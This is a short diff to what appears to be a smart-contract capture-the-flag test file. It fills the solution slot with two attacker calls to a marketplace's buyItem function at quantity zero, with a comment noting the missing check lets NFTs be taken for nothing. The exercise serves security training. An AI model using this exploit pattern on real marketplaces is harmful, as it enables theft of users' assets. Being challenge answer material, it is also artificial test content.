@@ -67,6 +67,12 @@ it("solves the challenge", async function () {
 
   // implement solution here
 
+
+  // can just buy items with 0 qty lulz. no checks, price nullifies with 0 qty.
+
+  await bonanzaMarketplace.connect(attacker).buyItem(nftA.address, 0, await adminUser.getAddress(), 0 );
+  await bonanzaMarketplace.connect(attacker).buyItem(nftB.address, 0, await adminUser.getAddress(), 0 );
+
 });
 
 /// expected final state
